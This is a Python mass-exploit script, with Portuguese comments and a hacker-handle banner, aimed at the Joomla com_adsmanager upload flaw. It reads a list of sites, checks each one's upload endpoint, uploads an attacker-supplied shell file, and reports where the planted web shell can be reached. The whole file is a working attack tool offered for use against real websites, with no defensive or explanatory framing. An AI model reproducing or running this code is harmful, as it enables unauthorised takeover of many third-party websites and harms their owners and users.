import requests as r
import sys
import colorama
import json
from colorama import Fore, Back, Style
colorama.init()
index = """
__  __            __                  ______               
\ \/ /_  ______  / /_____  __________/ ____/_______ _      __
 \  / / / / __ \/ //_/ _ \/ ___/ ___/ /   / ___/ _ \ | /| / /
 / / /_/ / / / / ,< /  __/ /  (__  ) /___/ /  /  __/ |/ |/ / 
/_/\__,_/_/ /_/_/|_|\___/_/  /____/\____/_/   \___/|__/|__/  
					Recoda nao comedia ;)
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# Joomla! com_adsmanager (R.F.U) Mass exploit
# Escrito por Supr3m0 ;)
# Facebook: @yunkers01 ou @supremoyc
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"""

x = sys.argv
script = x[0]
urls = []
if len(x) == 5:
	if x[1] == "--arquivo":
		lista = x[2]
		if "." not in lista:
			print(Fore.RED + " Arquivo ",lista, "Sem extensao.")
			exit()
		try:
			sh = open(lista, "r")
		except:
			print(Fore.RED + " Nao consegui abrir o ",lista, ".")
			exit()
	else:
		print(Fore.RED + " Use: python3",script, "--arquivo shell.txt --lista sites.txt")
		exit()
	if x[3] == "--lista":
		arq = x[4]
		if "." not in arq:
			print(Fore.RED + " Arquivo ",arq, "Sem extensao.")
			exit()
	else:
		print(Fore.RED + " Use: python3",script, "--arquivo shell.txt --lista sites.txt")
		exit()
else:
	print(Fore.RED + " Use: python3",script, "--arquivo shell.txt --lista sites.txt")
	exit()

try:
	arquivo = open(arq, "r")
	sites = arquivo.readlines()
except:
	print(Fore.RED + " Nao consegui abrir o ",arq, ".")
	exit()
	
print(Fore.GREEN + index)
tam = len(sites)
print(Fore.GREEN + "[+]" + Fore.WHITE + " Total de Sites:",tam)
print(Fore.GREEN + "[+]" + Fore.WHITE + " Arquivo:",arq)
print(Fore.GREEN + "\n[...]" + Fore.WHITE + " Iniciando...\n")

for url in sites:
	urls.append(url) 
	sites_x = [url.replace('\n','') for url in urls]

for i in sites_x:
	if i[:7] != "http://" and i[:8] != "https://":
		i = "http://" + i
	if i[-1] != "/":
		i = i + "/"
	path_vulneravel = i + "index.php?option=com_adsmanager&task=upload&tmpl=component"
	
	try:
		checa = r.get(path_vulneravel)
		if checa.status_code == 200:
			if "jsonrpc" in checa.text:
				print(Fore.GREEN + "\nVulneravel: " + Fore.WHITE + i)
				payload = {"file" : sh}
				data = {"name" : "supremo.html"}
				injeta = r.post(path_vulneravel, data=data, files=payload)
				decoda = json.loads(injeta.text)
				path_shell = i + "tmp/plupload/" + decoda["tmpfile"]
				checa2 = r.get(path_shell)
				if checa2.status_code == 200:
					print(Fore.GREEN + "Shell:" + Fore.WHITE + path_shell + "\n")
				else:
					print(Fore.RED + "Nao encontrei a shell: " + Fore.WHITE + path_shell)
			else:
				print(Fore.RED + "Nao Vulneravel: " + Fore.WHITE + i)
		else:
			print(Fore.RED + "Nao Vulneravel: " + Fore.WHITE + i)
	except Exception as e:
		print(Fore.RED + "Fora do ar: " + Fore.WHITE + i)

print(Fore.WHITE + "FINISH")
sh.close()
arquivo.close()
exit()
